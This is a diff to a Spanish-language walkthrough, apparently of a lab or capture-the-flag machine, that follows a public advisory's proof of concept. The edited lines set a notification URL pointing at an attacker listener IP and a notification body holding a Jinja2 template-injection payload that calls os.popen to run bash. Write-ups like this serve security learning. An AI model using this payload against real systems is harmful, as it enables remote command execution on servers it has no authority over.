@@ -132,6 +132,6 @@ Seguiremos el PoC `https://github.com/advisories/GHSA-4r7v-whpg-8rx3` lo primero
 
 Añadimos la url apuntando al servidor que hemos levantado 
 En edit cambiamos el timer a menos tiempo y en la zona de notifications añadimos:
-Notification URL list `get://10.10.11.34`
-`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c').read() }}`
+- Notification URL list `get://10.10.11.34:8882`
+- Notification body `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c').read() }}`
 
